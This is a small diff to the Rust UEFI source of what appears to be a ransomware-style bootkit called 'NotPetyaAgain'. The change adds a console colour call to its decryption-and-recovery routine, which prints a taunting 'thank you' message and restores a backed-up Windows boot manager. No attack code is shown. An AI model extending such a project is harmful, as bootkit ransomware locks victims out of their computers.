@@ -5,6 +5,7 @@ use alloc::vec::Vec;
 use core::fmt::Write;
 use core::ops::Range;
 use uefi::proto::media::block::BlockIO;
+use uefi::proto::console::text::Color;
 //use uefi::table::runtime::ResetType;
 use uefi::table::{Boot, SystemTable};
 //use uefi::Status;
@@ -121,6 +122,7 @@ pub fn recover(st: &mut SystemTable<Boot>, key_bytes: &[u8]) -> uefi::Result {
     st.stdout().clear()?;
     st.stdout().write_str("Decryption success! Please restart or turn off your PC.").unwrap();
     st.stdout().write_str("\nThank you for using NotPetyaAgain. Hope to NOT see you again.").unwrap();
+    st.stdout().set_color(Color::Red, Color::LightGray)?;
     write_var(st, "NotPetyaAgainId", &[]).unwrap();
 
     let windows_image = read_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi.old")?;
